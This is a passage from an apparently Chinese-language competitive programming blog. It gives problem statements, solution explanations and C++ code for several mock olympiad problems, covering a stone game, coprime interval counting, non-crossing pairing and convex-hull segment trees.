*ms[i].begin(); }); reverse(all(seg)); ll ans = 0; for (auto \u0026amp;[s, t, w]: seg) { s = lower_bound(all(u), s) - u.begin(); t = lower_bound(all(u), t) - u.begin(); int id = sgt.queryMin(s, t); if (id == inf) continue; ans += w; ms[xs[id]].erase(id); sgt.edit(xs[id], ms[xs[id]].empty() ? inf : *ms[xs[id]].begin()); } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } 二模 p1 stone 題意 A和B在玩拿石頭的遊戲，共有 $n$ 堆石頭，數量分別是 $a_1, a_2, \u0026hellip;, a_n$。\n首先A可以任選一堆，並從該堆取至少一個，至多 $R$ 個石頭（不能取超過該堆石頭數量）， 接著輪到B，再輪到A \u0026hellip;\n並且除了第一輪A取石頭以外，取的石頭數量都不能比對手多，但至少要取一個石頭。\n拿到最後一個石頭的人就勝利了，問A第一次取石頭有幾種方法可以讓A必勝？\n限制 $1 \\leq n \\leq 10^5$\n$1 \\leq R \\leq 10^9$\n$1 \\leq a_i \\leq 10^9$\nsubtask 1 (24) $1 \\leq n \\leq 3; 1 \\leq R \\leq 100; 1 \\leq a_i \\leq 100$\nsubtask 2 (13) $1 \\leq R \\leq 2$\nsubtask 3 (12) $n = 1$\nsubtask 4 (23) $1 \\leq n \\leq 5; 1 \\leq R \\leq 100; 1 \\leq a_i \\leq 100$\nsubtask 5 (28) 無額外限制\n作法 考慮 $R \\leq 2$ 的subtask。可以知道如果任何人拿了石頭之後，石頭的總數是偶數，那對方拿 1 個石頭就會勝利了，所以如果一開始石頭總數是奇數，那想要贏應該會盡量拿兩個石頭，而場上總共可以拿 $\\sum \\lfloor \\frac{a_i}{2} \\rfloor$ 次兩個石頭，因此判斷奇偶性就能知道誰最後會被迫拿奇數個石頭。 其實仔細想就能知道，不管 $R$ 是多少，沒有人會想讓自己拿完之後總石頭剩下奇數個，也就是說如果一開始總石頭是偶數個，那兩個人都會盡量避免拿奇數個石頭。\n可以發現只要 $R \u0026gt; 1$ ，設 $a_i\u0026rsquo;=\\lfloor \\frac{a_i}{2} \\rfloor, R\u0026rsquo;=\\lfloor \\frac{R}{2} \\rfloor$ ，解還是跟原本一樣 至此結論已經出來：從 $0 \\sim \\lfloor \\log_2 R \\rfloor$ 枚舉 $k$ 看 $\\sum \\lfloor \\frac{a_i}{2^k} \\rfloor$，如果任何一個 $k$ 發現 $\\sum \\lfloor \\frac{a_i}{2^k} \\rfloor$ 是奇數就表示先手必勝，否則先手必敗。事實上可以發現這等價於看所有 $a_i$ 的 xor 和的 lowbit 有沒有 $\\leq R$。 那要怎麼計算有幾種方法數呢？我們分開看每個 $i$ ，因為拿了之後剩下的數字 xor 和 lowbit 一定要 $\u0026gt;$ 你拿的數字，考慮枚舉這個 lowbit 是多少，可以發現對於每種lowbit 至多有一個數字會符合條件，總時間複雜度是 $\\mathcal{O}(n\\log R)$。 code 感謝 wiwiho 讓我參考 code\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 // An AC a day keeps the doctor away. #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe std::cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(args...) qqbx(#args, args) #define orange(args...) danb(#args, args) using std::cerr; template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...args) { int cnt = sizeof...(T); ((cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;), ..., (cerr \u0026lt;\u0026lt; args \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) ((void)0) #define orange(...) ((void)0) #endif // local #define all(v) begin(v),end(v) using namespace std; int lowbit(int x) { return x \u0026amp; -x; } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n, R; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; R; vector\u0026lt;int\u0026gt; a(n); for (int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; a[i]; int xor_sum = 0; for (int i = 0; i \u0026lt; n; i++) xor_sum ^= a[i]; if (xor_sum == 0 || lowbit(xor_sum) \u0026gt; R) return cout \u0026lt;\u0026lt; 0 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;, 0; int ans = 0; for (int i = 0; i \u0026lt; n; i++) { int newA = a[i]; for (int j = 0; j \u0026lt; 30; j++) { // assume 1 \u0026lt;\u0026lt; j as highbit of R\u0026#39; // lowbit(xor_sum ^ a[i] ^ (a[i] - R\u0026#39;)) \u0026gt; R\u0026#39; if ((xor_sum ^ a[i] ^ newA) \u0026gt;\u0026gt; j \u0026amp; 1) { if (newA \u0026lt; (1 \u0026lt;\u0026lt; j)) break; newA -= 1 \u0026lt;\u0026lt; j; } int newR = a[i] - newA; if (newR \u0026gt; 0 \u0026amp;\u0026amp; newR \u0026lt;= R \u0026amp;\u0026amp; (int)__lg(newR) == j) { ++ans; } } } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } p2 paving 題意 有 $n$ 個格子排成一列，分別編號為 $1, 2, \\dots, n$，一開始皆是未被塗色的狀態。\n另外有 $m$ 個操作，每個操作形如 $(l, r, x)$，表示要將編號介在 $[l, r]$ 之間且與 $x$ 互質的格子塗上顏色，問你最後未被塗色的格子有幾個。\n限制 $1 \\leq n \\leq 10^9$\n$1 \\leq m \\leq 1000$\n$1 \\leq l \\leq r \\leq n$\n$1 \\leq x \\leq 100$\nsubtask 1 (17) $n, m \\leq 1000$\nsubtask 2 (29) $1 \\leq x \\leq 20$\nsubtask 3 (28) 所有操作的 $[l, r]$ 並無任何交集\nsubtask 4 (26) 無額外限制\n作法 第一個 subtask 屬於比較簡單的分數。 第三個 subtask 可以直接排容。想算 $[l, r]$ 內跟 $x$ 有共同質因數的數字個數可以用前綴和相減，但是給定 $L,x$ 要怎麼算 $\\leq L$ 且跟 $x$ 不互質的數字個數呢？舉例來說，假設 $x = 30$，那麼答案就是 「所有 2 的倍數」+「所有 3 的倍數」+「所有 5 的倍數」-「所有 6 的倍數」-「所有 10 的倍數」-「所有 15 的倍數」+「所有 30 的倍數」。可以推出式子長得像 $\\sum_{d|x} \\left \\lfloor \\frac{L}{d} \\right \\rfloor \\cdot (-\\mu(d))$。 接著直接講 AY 教我的滿分解。首先可以把 $[1,n]$ 分成 $\\mathcal{O}(m)$ 個區間，對於每個 $[l,r]$ 有一個集合 $X$ ，想計算有多少正整數 $y$ 使得 $l \\leq y \\leq r$ 且 $\\forall x \\in X, \\gcd(y,x) \\neq 1$。考慮枚舉根號以下的質數是否是 $y$ 的因數，也就是 $2,3,5,7$。一個數字大於等於根號的質因數至多只有一個，因此如果 $x$ 不包含任何我們想讓 $y$ 包含的小質因數，那麼他的大質因數（可能不存在）$y$ 就必須擁有。對於一種枚舉，可以知道說 $y$ 必須跟哪些小質數互質、必須跟哪些質數不互質，而最後方法數可以透過排容計算。\n如果 $y$ 必須 $\\leq L$ 、跟集合 $S$ 內的小質數互質、並且是集合 $P$ 內的質數的倍數，那麼這樣的 $y$ 的種類大概是 $$\n\\sum _ {T \\subseteq S} (-1) ^ {|T|} \\left \\lfloor \\frac{L}{(\\prod _ {p\\in P} p)(\\prod _ {t\\in T} t)} \\right \\rfloor\n$$\n這樣計算的複雜度大概是 $\\mathcal{O}(c \\times 3^s \\times m)$，其中 $c$ 是值域而 $s$ 是值域的根號以下的質數數量（這題範圍是 4）\ncode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 // #define _GLIBCXX_DEBUG #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define pary(a...) danb(#a, a) #define debug(a...) qqbx(#a, a) template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...a) { int cnt = sizeof...(T); ((std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;) , ... , (std::cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\033[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) std::cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; std::cerr \u0026lt;\u0026lt; \u0026#34; ]\\033[0m\\n\u0026#34;; } #else #define debug(...) ((void)0) #define safe ((void)0) #define pary(...) ((void)0) #endif // local #define all(v) begin(v),end(v) #define pb emplace_back using namespace std; using ll = int64_t; template \u0026lt;typename T\u0026gt; using max_heap = priority_queue\u0026lt;T, vector\u0026lt;T\u0026gt;, less\u0026lt;T\u0026gt;\u0026gt;; const int maxn = 100025; const long long inf = 1000000001; const int prs[4] = {2, 3, 5, 7}; int bp[1 \u0026lt;\u0026lt; 4]; int square_free(int x) { for (int p: prs) while (x % (p*p) == 0) x /= p; return x; } int mul(int a, int b) { return min(inf, 1LL*a*b); } int cnt[101]; int calc(int L) { vector\u0026lt;int\u0026gt; has; for (int j = 1; j \u0026lt;= 100; j++) if (cnt[j]) has.push_back(j); int ans = 0; for (int s = 0, U = (1\u0026lt;\u0026lt;4)-1; s \u0026lt; (1\u0026lt;\u0026lt;4); s++) { bool fail = false; int prod = 1; bool inProd[100] = {}; for (int j: has) { bool coprime = (__gcd(j, bp[U ^ s]) == 1); if (coprime) { int bigPart = j / __gcd(j, 2 * 3 * 5 * 7); if (bigPart == 1) { prod = inf; break; } else { if (!inProd[bigPart]) prod = mul(prod, bigPart); inProd[bigPart] = true; } } } int M = L / bp[U ^ s] / prod; if (M == 0) continue; for (int m = s; ; m = (m-1) \u0026amp; s) { int coef = __builtin_parity(m) ? -1 : 1; ans += coef * (M / bp[m]); if (!m) break; } } #ifdef local int c = 0; for (int i = 1; i \u0026lt;= L; i++) { bool ok = true; for (int j: has) if (__gcd(j, i) == 1) ok = false; if (ok) ++c; } pary(all(has)); debug(ans, L, c); #endif // local return ans; } signed main() { for (int s = 0; s \u0026lt; (1\u0026lt;\u0026lt;4); s++) { bp[s] = 1; for (int i = 0; i \u0026lt; 4; i++) if (s \u0026gt;\u0026gt; i \u0026amp; 1) bp[s] *= prs[i]; } ios_base::sync_with_stdio(0), cin.tie(0); int n, m; assert( cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m ); vector\u0026lt;pair\u0026lt;int,int\u0026gt;\u0026gt; evt; for (int i = 0; i \u0026lt; m; i++) { int l, r, x; assert( cin \u0026gt;\u0026gt; l \u0026gt;\u0026gt; r \u0026gt;\u0026gt; x ); assert( 1 \u0026lt;= l \u0026amp;\u0026amp; l \u0026lt;= r \u0026amp;\u0026amp; r \u0026lt;= n ); assert( 1 \u0026lt;= x \u0026amp;\u0026amp; x \u0026lt;= 100 ); x = square_free(x); --l; evt.emplace_back(l, x); evt.emplace_back(r, -x); } evt.emplace_back(0, 0); evt.emplace_back(n, 0); sort(all(evt)); int ans = 0; for (int i = 0, j = 0; i \u0026lt; evt.size(); i = j) { for (j = i; j \u0026lt; evt.size(); j++) { if (evt[j].first != evt[i].first) break; int x = evt[j].second; if (x \u0026gt; 0) { ++cnt[x]; } else if (x \u0026lt; 0) { --cnt[-x]; } } if (j == evt.size()) continue; int l = evt[i].first; int r = evt[j].first; int cur = calc(r) - calc(l); ans += cur; debug(l, r, cur); } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } /* 15 2 1 15 3 1 15 15 10000 2 1 10000 22 1 10000 33 */ p3 pairing 題意 給定一個序列 $a_1, a_2, \u0026hellip;, a_n$，現在要從 ${1, 2, \\dots n}$ 中選一些點配對，並且獲得最高的總分。\n一個點只能被匹配最多一次，當兩個點 $i$ 與 $j$ 配對時（$i \u0026lt; j$），就會獲得 $a_i + a_{i+1} + \\cdots + a_j$ 的分數。\n此外，任何配對都不能出現部份相交的情形，也就是說，對於任兩個配對 $i \u0026lt; j$ 與 $k \u0026lt; l$，不能出現 $i \u0026lt; k \u0026lt; j \u0026lt; l$ 的情形。\n匹配結束後，所有沒有被匹配到的點 $i$ ，如果 $a_i \u0026gt; 0$，可以獲得額外的 $a_i$ 分。\n最終得分就是所有選中的配對獲得的分數，與上述的額外分數的總和。\n請找出最終得分最大是多少。\n限制 $1 \\leq n \\leq 10^5$\n$-10^9 \\leq a_i \\leq 10^9$\nsubtask 1 (9) $1 \\leq n \\leq 20$\nsubtask 2 (16) $1 \\leq n \\leq 500$\nsubtask 3 (33) $1 \\leq n \\leq 3000$\nsubtask 4 (42) 無額外限制\n作法 首先要注意題意的理解，因為範測實在蠻爛的。\n原本筆者以為兩個配對的點中間不能再有其他配對的點，像是AI666那樣，但其實不是，題目的意思是兩組配對不能「交叉」，但可以完全包含在另一個配對中間，例如$a = [1,2,3,4]$的話，我們可以把1跟4配、2跟3配來得到15分。\nsubtask 2, 3\n理解了正確的題意之後會發現這跟括弧匹配有點像，可以嘗試dp。應該有蠻多種方式去dp的，這裡列出$\\mathcal{O}(n^3)$和$\\mathcal{O}(n^2)$各一種。\n$\\mathcal{O}(n^3)$ $sum_{l,r}$是$[l,r]$區間的和。\n$$dp_{l,r}=\\max(dp_{l+1,r-1}+sum_{l,r},dp_{l+1,r}+a_l,dp_{l,r-1}+a_r,\\max\\limits_{l\\leq m \u0026lt; r}(dp_{l,m}+dp_{m+1,r}))$$ $\\mathcal{O}(n^2)$ $pre_i$是前綴和\n$dp_{i,b}$表示前綴$i$、左括弧比右括弧多$b$個\n$$\ndp_{i,b}=\\max(dp_{i-1,b}+\\max(a_i,0), dp_{i-1,b-1}-pre_{i-1},dp_{i-1,b+1}+pre_i)\n$$ 滿分解\n如果對括弧匹配再仔細想的話，可以發現這題可以歸約成這題。\n對於每個點，我可以計算他當左括弧的收益$-pre_{i-1}-\\max(a_i,0)$、他當右括弧的收益$pre_i-\\max(a_i,0)$（最後的額外加分用扣的算），而都不當的代價當成0，接著我們從左到右依序決定每個點應該當左括弧、右括弧還是都不當。我們維護兩個heap，一個放前面未配對的點，key是他變成左括弧增加的價值；一個放前面已經當右括弧的點，key是他變成未配對的點損失的價值，那每次遇到一個點就會先看他當右括弧的價值，左括弧跟他配的可能有兩種情況：\n前面還沒有配對的點，會貪心的選價值最大的 拆開前面某對配對，等於跟前面的右括弧替換，會貪心的選替換之後損失最少 兩種情況可以選價值比較大的那個，假如配起來的總價值是正的那我們就把他改成右括弧，否則就把他先當作未配對的點變成潛力左括弧，兩種情況都需要好好更新heap。如果再想細一點其實這兩個heap可以併在一起XD說明就略過了。\n這個技巧被ZCK稱為可undo greedy，因為我們可以很輕鬆的把已經選的配對點拆開或是計算拆開之後減少的價值，所以就可以維護heap來決定要do誰跟undo誰。\ncode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int maxn = 100025; template \u0026lt;typename T\u0026gt; using max_heap = priority_queue\u0026lt;T, vector\u0026lt;T\u0026gt;, less\u0026lt;T\u0026gt;\u0026gt;; int a[maxn]; long long pre[maxn]; signed main() { int n; cin \u0026gt;\u0026gt; n; for (int i = 1; i \u0026lt;= n; i++) cin \u0026gt;\u0026gt; a[i]; for (int i = 1; i \u0026lt;= n; i++) pre[i] = pre[i-1] + a[i]; max_heap\u0026lt;long long\u0026gt; pq; long long ans = 0; for (int i = 1; i \u0026lt;= n; i++) ans += max(a[i], 0); for (int i = 1; i \u0026lt;= n; i++) { long long lbraceValue = -pre[i-1] - max(a[i], 0); long long rbraceValue = pre[i] - max(a[i], 0); if (!pq.empty() \u0026amp;\u0026amp; rbraceValue + pq.top() \u0026gt; 0) { ans += rbraceValue + pq.top(), pq.pop(); pq.push(lbraceValue); pq.push(-rbraceValue); } else { pq.push(lbraceValue); } } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } p4 tangent 題意 記憶體限制為 128 MB\n二維平面上有 $n$ 個點 $(x, y)$，有 $m$ 條線段分別從上方無窮遠處落下，要對每個線段輸出最先碰到的點是誰，如果沒有碰到任何點要輸出 $-1$，如果有多個最先碰到的點請輸出 $x$ 座標最小的。\n線段在下落的過程中保持斜率不變，故每個線段可以用三個參數 $(a, w, h)$ 描述，\n表示若在下落的過程中，左端點和右端點的座標分別是 $(x_l, y_l), (x_r, y_r)$，\n則 $x_l = a，x_r - x_l = w, y_r - y_l = h$。\n限制 $1 \\leq n \\leq 5 \\times 10^5$\n$1 \\leq m \\leq 10^5$\n$-10^9 \\leq x, y \\leq 10^9$\n所有點皆相異\n$-10^9 \\leq a \\leq 10^9$\n$0 \\leq w \\leq 2 \\times 10^9; -10^9 \\leq h \\leq 10^9; (w, h) \\neq (0, 0)$\nsubtask 1 (19) $n, m \\leq 1000$\nsubtask 2 (30) $n, m \\leq 10^5$\nsubtask 3 (51) 無額外限制\n作法 這題的 subtask 切的蠻爛的@@\n注意鉛直線的case最好小心處理，此外賽中subtask 1的測資沒有強到會驗出鉛直線的問題，許多人被這件事影響。\n假設這題不是詢問線段而是詢問直線的話，那麼我們可以維護點的上凸包，每次詢問一條直線就相當於詢問凸包在某個方向的極點（extreme point），而這可以用三分搜解決，或是對詢問依照斜率排序之後用類似單調stack的方式解決。\n現在詢問並不是一整條直線，而是 $x$ 座標的一段區間，要怎麼處理區間詢問呢？答案就是開線段樹，每個節點存包含對應區間的所有點形成的上凸包，就能只詢問 $x$ 座標介於一段區間的點了。空間複雜度大概是 $\\mathcal{O}(n\\log n)$ ，本題範圍差不多是可以開下 $3 \\times 10^7$ 個 int，而 $n\\log n$大約是 $10^7$，所以要小心常數不要太多倍，線段樹裡面可能只能存點的編號。時間複雜度可以是 $\\mathcal{O}(n\\log n + m\\log^2n)$ 或是\n$\\mathcal{O}(n\\log n + m(\\log m + \\log n))$，依照實做方式而定。\n當然，如果想要空間 $\\mathcal{O}(N)$ 的話，也可以用分塊在時間 $\\mathcal{\\tilde O}(N+M\\sqrt{N})$ 解決本題，或是離線之後讓線段樹每一層分開處理，因為一層只需要 $\\mathcal{O}(N)$ 的空間。\ncode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 // #define _GLIBCXX_DEBUG #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define pary(a...) danb(#a, a) #define debug(a...) qqbx(#a, a) template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...a) { int cnt = sizeof...(T); ((std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;) , ... , (std::cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\033[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) std::cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; std::cerr \u0026lt;\u0026lt; \u0026#34; ]\\033[0m\\n\u0026#34;; } #else #define debug(...) ((void)0) #define safe ((void)0) #define pary(...) ((void)0) #endif // local #define all(v) begin(v),end(v) #define pb emplace_back using namespace std; using ll = int64_t; template \u0026lt;typename T\u0026gt; using max_heap = priority_queue\u0026lt;T, vector\u0026lt;T\u0026gt;, less\u0026lt;T\u0026gt;\u0026gt;; const int maxn = 500025, maxq = 100025; const ll INF = 3e18; struct Point { int x, y, id; } p[maxn]; int u[maxn]; void buildConvexHull(vector\u0026lt;int\u0026gt; \u0026amp;v) { static const auto check = [](int a, int b, int c) { ll x1 = p[b].x - p[a].x, y1 = p[b].y - p[a].y; ll x2 = p[c].x - p[b].x, y2 = p[c].y - p[b].y; return x1 * y2 - x2 * y1 \u0026gt;= 0; }; size_t j = 0; for (size_t i = 0; i \u0026lt; v.size(); i++) { while (j \u0026gt;= 2 \u0026amp;\u0026amp; check(v[j-2], v[j-1], v[i])) --j; v[j++] = v[i]; } v.resize(j); } tuple\u0026lt;ll,int,int\u0026gt; queryConvexHull(vector\u0026lt;int\u0026gt; \u0026amp;v, int w, int h) { tuple\u0026lt;ll,int,int\u0026gt; ans(-INF, 0, -1); if (v.empty()) return ans; auto f = [\u0026amp;](int i) { auto [x, y, id] = p[i]; return tuple\u0026lt;ll,int,int\u0026gt;(1LL * w * y - 1LL * h * x, x, id); }; while (v.size() \u0026gt;= 2 \u0026amp;\u0026amp; f(v.rbegin()[0]) \u0026lt;= f(v.rbegin()[1])) v.pop_back(); return f(v.back()); } struct Segtree { int n; vector\u0026lt;int\u0026gt; st[maxn * 2]; void build(int _n) { n = _n; for (int i = 0; i \u0026lt; n; i++) st[i+n].push_back(i); for (int i = n-1; i \u0026gt; 0; i--) { st[i].resize(st[i\u0026lt;\u0026lt;1].size() + st[i\u0026lt;\u0026lt;1|1].size()); merge(all(st[i\u0026lt;\u0026lt;1]), all(st[i\u0026lt;\u0026lt;1|1]), st[i].begin(), [](int a, int b){ return a \u0026lt; b; }); buildConvexHull(st[i]); } } int query(int l, int r, int w, int h) { tuple\u0026lt;ll,int,int\u0026gt; res(-INF, 0, -1); for (l += n, r += n; l \u0026lt; r; l \u0026gt;\u0026gt;= 1, r \u0026gt;\u0026gt;= 1) { if (l \u0026amp; 1) res = max(res, queryConvexHull(st[l++], w, h)); if (r \u0026amp; 1) res = max(res, queryConvexHull(st[--r], w, h)); } return get\u0026lt;2\u0026gt;(res); } } sgt; struct Query { int l, r, w, h; int qid; } qs[maxq]; int ans[maxq]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n; cin \u0026gt;\u0026gt; n; for (int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; p[i].x \u0026gt;\u0026gt; p[i].y, p[i].id = i+1; sort(p, p+n, [](Point a, Point b){ return a.x \u0026lt; b.x; }); { int j = 0; for (int i = 0; i \u0026lt; n; i++) { if (!i || p[i].x != p[i-1].x) { p[j++] = p[i]; } else if (p[j-1].y \u0026lt; p[i].y) { p[j-1] = p[i]; } } n = j; } for (int i = 0; i \u0026lt; n; i++) u[i] = p[i].x; sgt.build(n); int q; cin \u0026gt;\u0026gt; q; for (int i = 0; i \u0026lt; q; i++) { int a, w, h; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; w \u0026gt;\u0026gt; h; int l = lower_bound(u, u+n, a) - u; int r = lower_bound(u, u+n, a+w+1) - u; qs[i] = { l, r, w, h, i }; } sort(qs, qs+q, [](Query a, Query b) { return 1LL * a.w * b.h \u0026gt; 1LL * a.h * b.w; }); for (int i = 0; i \u0026lt; q; i++) { auto [l, r, w, h, qid] = qs[i]; ans[qid] = sgt.query(l, r, w, h); } for (int i = 0; i \u0026lt; q; i++) cout \u0026lt;\u0026lt; ans[i] \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } 三模 p1 flower 題意 有排成一列的 $n$ 朵花，品種分別是 $F_1, F_2, \u0026hellip; F_n$\n要你選出 $k$ 朵品種不同的花，並且他們的位置也都不相鄰，請由小到大輸出選的花的位置。\n若有多組解請輸出字典序最小的解，無解則輸出 $0$。\n限制 一組輸入檔案有 $T$ 筆測試資料\n$T \\leq 5$ （賽中 clarification）\n$1 \\leq n \\leq 10 ^ 6$\n$1 \\leq k \\leq \\min(22, n)$\n$1 \\leq F_i \\leq n$\nsubtask 1 (16) $1 \\leq k \\leq n \\leq 18$\nsubtask 2 (41) $1 \\leq n \\leq 100; 1 \\leq k \\leq 20; k \\leq n$\nsubtask 3 (43) 無額外限制\n作法 直接講滿分解。\n考慮最左邊的花，也就是 $F_1$，\n如果不選 $F_1$ 的話，最佳解一定包含 $F_2$ 這朵花，不論 $F_2$ 和 $F_1$ 是否相同（兩者都不選的話可以把最後一朵或是同樣顏色的換成最前面這朵）\n更一般地，假設目前已經選了一些花，那麼把不能選的花去除之後，最前面的那朵花和他的下一朵一定恰好會選一朵，因此這樣遞迴下去時間複雜度會類似 $T(k) = T(k-1) + T(k-1) + \\mathcal{O}(f(n, k))$ 之類的，其中 $f(n, k)$ 是快速維護「選了一個花之後剩下來最前面可以拿的花是誰」的複雜度，只要好好寫的話都可以通過本題，一種方法是只維護最先出現的 $2k$ 種顏色目前還沒被佔據的位置最前面是誰，總複雜度 $\\mathcal{O}(n + k2^k)$。\nsubtask 1 是直接枚舉\nsubtask 2 應該是給糟糕的 $f(n, k)$。\ncode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 // An AC a day keeps the doctor away. #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe std::cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(args...) qqbx(#args, args) #define orange(args...) danb(#args, args) using std::cerr; template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...args) { int cnt = sizeof...(T); ((cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;), ..., (cerr \u0026lt;\u0026lt; args \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) ((void)0) #define orange(...) ((void)0) #endif // local #define all(v) 